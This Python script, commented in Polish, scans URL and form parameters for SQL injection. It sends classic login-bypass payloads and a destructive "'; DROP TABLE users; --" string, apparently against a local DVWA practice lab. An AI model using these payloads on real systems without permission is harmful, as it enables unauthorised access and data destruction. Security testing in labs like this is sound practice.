import requests
from urllib.parse import urlparse, parse_qs, urlencode
import re

#robimy liste klasycznych paylodow
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "\" OR \"\" = \"",
    "' OR '' = '",
    "' OR 1=1#",
    "admin' --",
    "' OR 'a'='a"
]

#klasyczne bledy sql, jesli jest podatnosc i przejdzie to powinno zwrocic ktores z tych
SQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE",
    "ODBC",
    "Microsoft JET Database"
]

#glowna funkcja, bierzem funkcje, uzywamy metody get, dane sa do posta
def test_sql_injection(url, method="GET", data=None):
    print(f"[*] Testujemy {url}")
    
    #najpierw zakladamy ze nie jestp odatna
    vulnerable = False
    
    #iterujemy po payloadach
    for payload in SQL_PAYLOADS:
       ## #DLA GET
        if method.upper() == "GET":
            parsed_url = urlparse(url) #rozkladamy url na czesci
            query = parse_qs(parsed_url.query) #.query ma to co nas interesuje
            #przechodzimy po parametrach geta- ip, name itd
            for param in query:
                #orygialna wartosc parametru, jesli potrzebna bedzie do przywrocenia
                original = query[param][0]
                #podmieniamy parametr na payload
                query[param][0] = payload
                #przeksztalcamy slownik na url
                new_query = urlencode(query, doseq=True) 
                #nowy url z payloadem
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                #wysylamy zapytanie
                response = requests.get(new_url)
                #sprawdzamy odpowiedz czy nie ma bledow
                if any(error in response.text for error in SQL_ERRORS):
                    print(f" Mozliwa podatnosc SQLi w parametrze '{param}' przy payloadzie: {payload}")
                    vulnerable = True
       ## #DLA POST, musza byc tez dane
        elif method.upper() == "POST" and data:
            #znowu iterujemy
            for param in data:
                original = data[param] #znowu oryginalna war
                data[param] = payload #zmieniamy parametr na payload
                #wysylamy nowe zapytanie post z paylodaem
                response = requests.post(url, data=data, allow_redirects=True)
                #szukamy bledow

                #zakomentowane bo zmienilem pod dvwa

                #if any(error in response.text for error in SQL_ERRORS):
                    #print(f"Mozliwa podatnosc SQLi w parametrze '{param}' przy payloadzie: {payload}")
                   # vulnerable = True
                if "Welcome" in response.text or "DVWA" in response.text:
                    print(f"Prawdopodobna podatnosc SQLi w '{param}' z payloadem: {payload}")
                    vulnerable = True
                data[param] = original
        else:
            print("[!] Nieprawidlowa metoda lub brak danych do POST.")
            return
    
    if not vulnerable:
        print("Nie wykryto podatnosci SQL Injection.")

#przykladowe uzycie
if __name__ == "__main__":
    #get
    test_sql_injection("http://localhost/login.php", method="GET")

    #pst
    post_data = {
        "username": "admin",
        "password": "admin"
    }
    test_sql_injection("http://localhost/login.php", method="POST", data=post_data)
